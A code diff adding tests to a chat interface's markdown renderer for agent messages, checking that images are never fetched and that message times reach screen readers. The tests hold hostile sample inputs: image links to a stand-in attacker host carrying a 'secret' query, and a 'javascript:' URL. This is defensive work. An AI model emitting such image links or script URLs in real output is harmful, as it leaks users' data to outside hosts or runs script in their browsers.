@@ -13,12 +13,19 @@ import { AssistantMessage } from "./thread.aui";
 afterEach(cleanup);
 
 /** Renders `text` as an agent message through the real message component (no viewport). */
-function Harness({ text }: { text: string }) {
+function Harness({ text, createdAt }: { text: string; createdAt?: Date }) {
   const message: ThreadMessageLike = {
     id: "msg-1",
     role: "assistant",
-    content: [{ type: "text", text }],
+    content: [
+      // who ran (the marker ThreadAgent puts in front of an invocation's output)
+      ...(createdAt
+        ? [{ type: "data" as const, name: "vymalo.actor", data: { type: "agent", name: "coder" } }]
+        : []),
+      { type: "text", text },
+    ],
     status: { type: "complete", reason: "stop" },
+    ...(createdAt ? { createdAt } : {}),
   };
   const runtime = useExternalStoreRuntime<ThreadMessageLike>({
     messages: [message],
@@ -79,5 +86,49 @@ describe("MarkdownText", () => {
       expect(href, `href of "${a.textContent}"`).not.toMatch(/^\s*(javascript|data|vbscript):/i);
     }
     expect((window as unknown as { __pwned?: number }).__pwned).toBeUndefined();
+  });
+
+  it("an image is never fetched: its alt text, and a link only for an http(s) URL", async () => {
+    const log = await renderAgentText(
+      [
+        "![the diagram](https://evil.example/p.png?d=secret)",
+        "![](https://evil.example/q.png)",
+        "![bad](javascript:window.__pwned=5)",
+        "[![nested](https://evil.example/r.png)](https://example.com/page)",
+      ].join("\n\n"),
+    );
+    expect(log.querySelector("img, picture, source, image")).toBeNull();
+    expect(document.querySelector('link[rel="preload"], link[rel="prefetch"]')).toBeNull();
+    const link = [...log.querySelectorAll("a")].find((a) => a.textContent?.includes("the diagram"));
+    expect(link?.getAttribute("href")).toBe("https://evil.example/p.png?d=secret");
+    expect(link?.getAttribute("target")).toBe("_blank");
+    expect(link?.getAttribute("rel")).toBe("noopener noreferrer");
+    // no alt text: it is still said to be an image
+    expect(log.textContent).toContain("image");
+    // a script URL is no link
+    for (const a of log.querySelectorAll("a")) {
+      expect(a.getAttribute("href") ?? "").not.toMatch(/^\s*javascript:/i);
+    }
+    expect(log.textContent).toContain("bad");
+    // an image inside a link is its text, inside the one link
+    const page = [...log.querySelectorAll("a")].find(
+      (a) => a.getAttribute("href") === "https://example.com/page",
+    );
+    expect(page?.textContent).toContain("nested");
+    expect(page?.querySelector("a")).toBeNull();
+    expect((window as unknown as { __pwned?: number }).__pwned).toBeUndefined();
+  });
+
+  it("the time of a turn is text a screen reader reaches, not only a tooltip", async () => {
+    const at = new Date("2026-09-30T10:00:00Z");
+    render(<Harness text="hello" createdAt={at} />);
+    const log = await screen.findByRole("log", { name: "Conversation" });
+    await waitFor(() =>
+      expect(log.querySelector("[data-slot='message-time'] time")).not.toBeNull(),
+    );
+    const time = log.querySelector("[data-slot='message-time'] time") as HTMLTimeElement;
+    expect(time.getAttribute("datetime")).toBe(at.toISOString());
+    expect(time.textContent).toBe(at.toLocaleString());
+    expect(time.closest(".sr-only")).not.toBeNull();
   });
 });
